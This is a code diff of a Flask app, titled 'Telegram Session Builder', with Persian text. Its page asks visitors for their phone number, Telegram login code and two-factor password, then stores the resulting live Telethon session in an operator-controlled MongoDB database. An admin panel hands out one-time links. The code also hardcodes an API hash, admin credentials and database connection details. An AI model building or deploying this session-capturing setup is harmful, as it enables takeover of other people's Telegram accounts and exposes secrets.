@@ -1,16 +1,17 @@
 # ================================================================
-# Telegram Session Builder – Full Stable Version
-# Admin Panel + MongoDB + One-Time Links + Keep Alive
+# Telegram Session Builder – Full Stable Version with Auto Keep-Alive
 # By: Tiam
 # ================================================================
 
-import os, asyncio, threading, secrets, time
+import os, asyncio, threading, secrets
 from flask import Flask, request, jsonify, render_template_string, redirect
 from telethon import TelegramClient
 from telethon.sessions import StringSession
 from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
 from pymongo import MongoClient
 from datetime import datetime
+import requests
+import time
 
 # ===================== CONFIG ===================================
 
@@ -19,7 +20,8 @@ self_config = {
     "api_hash": "88c0167b74a24fac0a85c26c1f6d1991",
     "admin_username": "tiam.",
     "admin_password": "tiam_khorshid",
-    "save_path": "sessions"  # مسیر ذخیره session ها
+    "save_path": "sessions",
+    "base_url": "https://anime-1127-bot-3.onrender.com"
 }
 
 os.makedirs(self_config["save_path"], exist_ok=True)
@@ -33,7 +35,6 @@ mongo_uri = (
     "ac-hw2zgfj-shard-00-02.morh5s8.mongodb.net:27017/"
     "?replicaSet=atlas-7m1dmi-shard-0&ssl=true&authSource=admin"
 )
-
 mongo = MongoClient(mongo_uri)
 db = mongo["telegram_sessions"]
 sessions_col = db["sessions"]
@@ -62,22 +63,26 @@ def run_async(coro):
 
 # ===================== HTML =====================================
 
-HTML_PAGE = """
+HTML_PAGE = f"""
 <!DOCTYPE html>
 <html>
 <head>
-<title>ساخت سشن تلگرام</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Telegram Session Builder</title>
 <style>
-body{background:url('/static/images/astronomy-1867616_1280.jpg') no-repeat center fixed;background-size:cover;font-family:tahoma;color:white}
-.box{width:360px;margin:120px auto;padding:25px;background:rgba(0,0,0,.65);border-radius:16px;text-align:center}
-input,button{width:95%;padding:12px;margin-top:10px;border-radius:10px;border:none;font-size:16px}
-button{background:#5865f2;color:white;cursor:pointer}
+body{{background:url('/static/images/astronomy-1867616_1280.jpg') no-repeat center fixed;
+background-size:cover;font-family:tahoma;color:white}}
+.box{{width:360px;margin:120px auto;padding:25px;background:rgba(0,0,0,.65);
+border-radius:16px;text-align:center}}
+input,button{{width:95%;padding:12px;margin-top:10px;border-radius:10px;border:none;font-size:16px}}
+button{{background:#5865f2;color:white;cursor:pointer}}
 </style>
 </head>
 <body>
 <div class="box">
 <h3>ساخت سشن تلگرام</h3>
-<p>شماره خود را با فرمت وارد کنید مثال: <b>+98939xxxxxxx<b> <p>
+
 <div id="s1">
 <input id="phone" placeholder="شماره تلفن">
 <button onclick="sendPhone()">ارسال کد</button>
@@ -101,32 +106,42 @@ button{background:#5865f2;color:white;cursor:pointer}
 <script>
 let phone="";
 
-function sendPhone(){
- phone = document.getElementById("phone").value;
- fetch("/send_phone",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone})})
- .then(r=>r.json()).then(d=>{
+function formatPhone(num){{
+    num = num.trim();
+    if(num.startsWith("0")){{ return "+98"+num.slice(1); }}
+    if(num.startsWith("9")){{ return "+98"+num; }}
+    return num;
+}}
+
+function sendPhone(){{
+ phone = formatPhone(document.getElementById("phone").value);
+ fetch("/send_phone",{{method:"POST",headers:{{"Content-Type":"application/json"}},
+ body:JSON.stringify({{phone}})}})
+ .then(r=>r.json()).then(d=>{{
    alert(d.message);
-   if(d.status=="ok"){s1.style.display="none";s2.style.display="block";}
- });
-}
+   if(d.status=="ok"){{s1.style.display="none";s2.style.display="block";}}
+ }});
+}}
 
-function sendCode(){
- fetch("/send_code",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone,code:code.value})})
- .then(r=>r.json()).then(d=>{
-   if(d.status=="2fa"){s2.style.display="none";s3.style.display="block";}
-   if(d.status=="ok"){finish();}
- });
-}
+function sendCode(){{
+ fetch("/send_code",{{method:"POST",headers:{{"Content-Type":"application/json"}},
+ body:JSON.stringify({{phone,code:code.value}})}})
+ .then(r=>r.json()).then(d=>{{
+   if(d.status=="2fa"){{s2.style.display="none";s3.style.display="block";}}
+   if(d.status=="ok"){{finish();}}
+ }});
+}}
 
-function sendPassword(){
- fetch("/send_password",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone,password:password.value})})
- .then(r=>r.json()).then(d=>{if(d.status=="ok"){finish();}});
-}
+function sendPassword(){{
+ fetch("/send_password",{{method:"POST",headers:{{"Content-Type":"application/json"}},
+ body:JSON.stringify({{phone,password:password.value}})}})
+ .then(r=>r.json()).then(d=>{{if(d.status=="ok"){{finish();}}}});
+}}
 
-function finish(){
+function finish(){{
  s1.style.display=s2.style.display=s3.style.display="none";
  done.style.display="block";
-}
+}}
 
 setInterval(()=>fetch("/ping"),240000);
 </script>
@@ -164,6 +179,54 @@ def ping():
 
 # ===================== Admin Panel ===============================
 
+ADMIN_HTML = f"""
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>پنل ادمین</title>
+<style>
+body{{background:#121212;color:white;font-family:tahoma;padding:20px}}
+h2{{text-align:center}}
+form{{margin-bottom:20px;text-align:center}}
+input{{padding:10px;width:120px;border-radius:6px;border:none;margin-right:10px}}
+button{{padding:10px 20px;border:none;border-radius:6px;background:#5865f2;color:white;cursor:pointer}}
+table{{width:100%;border-collapse:collapse;margin-top:20px}}
+th,td{{border:1px solid #444;padding:8px;text-align:center}}
+.copy-btn{{background-color:#fff;color:#212121;border:none;padding:6px 12px;border-radius:6px;cursor:pointer}}
+.copy-btn:hover{{background:#f0f0f0}}
+</style>
+</head>
+<body>
+<h2>پنل ادمین</h2>
+<form method="post">
+<input name="max" type="number" placeholder="تعداد استفاده" required>
+<button>ساخت لینک</button>
+</form>
+<table>
+<tr><th>لینک</th><th>استفاده</th><th>عملیات</th><th>کپی</th></tr>
+{% for l in links %}
+<tr>
+<td>{{ l['token'] }}</td>
+<td>{{ l['used'] }} / {{ l['max'] }}</td>
+<td><a href="/admin/delete/{{ l['token'] }}">❌ حذف</a></td>
+<td><button class="copy-btn" onclick="copyLink('{{ l['token'] }}')">📋 کپی</button></td>
+</tr>
+{% endfor %}
+</table>
+
+<script>
+function copyLink(token){{
+    const link = "{self_config['base_url']}/?key=" + token;
+    navigator.clipboard.writeText(link).then(()=>{{alert("لینک کپی شد!");}});
+}}
+</script>
+
+</body>
+</html>
+"""
+
 @app.route("/admin", methods=["GET","POST"])
 def admin():
     auth = request.authorization
@@ -179,29 +242,8 @@ def admin():
         })
         return redirect("/admin")
 
-    rows=""
-    for l in links_col.find():
-        rows+=f"""
-        <tr>
-        <td>?key={l['token']}</td>
-        <td>{l['used']} / {l['max']}</td>
-        <td>
-        <button onclick="navigator.clipboard.writeText('?key={l['token']}')">کپی لینک</button>
-        <a href="/admin/delete/{l['token']}">❌ حذف</a>
-        </td>
-        </tr>
-        """
-
-    return f"""
-    <html><body style="background:#111;color:white;font-family:tahoma">
-    <h2>پنل ادمین</h2>
-    <form method="post">
-    <input name="max" type="number" placeholder="تعداد استفاده" required>
-    <button>ساخت لینک</button>
-    </form>
-    <table border=1 cellpadding=10>{rows}</table>
-    </body></html>
-    """
+    links = list(links_col.find())
+    return render_template_string(ADMIN_HTML, links=links)
 
 @app.route("/admin/delete/<token>")
 def delete(token):
@@ -222,8 +264,8 @@ async def create_client(phone):
         self_config["api_id"],
         self_config["api_hash"],
         device_model="⦁ 𝑺𝒆𝒍𝒇 𝑵𝒊𝒙",
-        system_version="13",
-        app_version="10.5.0",
+        system_version=".",
+        app_version="10.5",
         lang_code="fa",
         system_lang_code="fa"
     )
@@ -267,16 +309,15 @@ def send_password():
     run_async(job())
     return jsonify(status="ok")
 
-# ===================== Keep Alive ===============================
+# ===================== Keep-Alive ==============================
 
 def keep_alive():
     while True:
-        for phone, client in clients.items():
-            try:
-                run_async(client.get_me())
-            except:
-                pass
-        time.sleep(120)
+        try:
+            requests.get(self_config["base_url"])
+        except:
+            pass
+        time.sleep(240)  # هر ۴ دقیقه
 
 threading.Thread(target=keep_alive, daemon=True).start()
 
